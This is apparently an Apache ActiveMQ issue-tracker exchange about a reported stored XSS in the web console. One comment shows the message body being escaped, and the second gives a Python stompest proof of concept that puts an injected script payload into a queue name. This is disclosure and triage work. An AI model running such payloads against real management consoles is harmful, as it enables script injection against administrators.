[Are there any details on how XSS is created when viewing the message in the management console?, I tried the following test:
 * Post a message to a queue with the bodyÂ 
{code:java}
<script src="abc"></script>
{code}

 * View in the web console (shows correctly - I see the literal body displayed on the web console)
 * "Show Sources" - looks correct:
{code:java}
<td><div class="message"><pre class="prettyprint">&lt;script src=&#034;abc&#034;&gt;&lt;/script&gt;</pre></div></td>
{code}

Not sure what else might be the problem.

Here's the code, by the way (in message.jsp) - note the use of c:out
{code:java}
<td><div class="message"><pre class="prettyprint"><c:out value="${requestContext.messageQuery.body}"/></pre></div></td>
{code}, Hey,

this was reported a while ago for an older version of Apache MQ (from memory I think it was 5.10?)

The web management console does not sanitise the content of MQ messages when they are displayed.

Any user with the ability to submit MQ messages can submit a message which causes a stored XSS in the web management console when viewed by an administrative user.

the following python script demonstrates the issue: (the message content is : '/queue/c"></a><script>alert(1)</script>' )

import time
from stompest.config import StompConfig
from stompest.sync import Stomp
from stompest.protocol import commands, StompFrame, StompSpec


client = Stomp(StompConfig('tcp://192.168.221.139:61613', login='guest', passcode='password', version=StompSpec.VERSION_1_1))

QUEUE = '/queue/c"></a><script>alert(1)</script>'

FRAME = StompFrame(StompSpec.SEND, rawHeaders=[('user', 'bar1'), ('password', 'bar2')])

if __name__ == '__main__':
    client.connect(host='/', headers={u'receipAAAAAAAAAAAd': u'important-begin'})
    client.send(QUEUE, FRAME)
    #client.send(QUEUE, 'test message 2')
    client.disconnect()


cheers
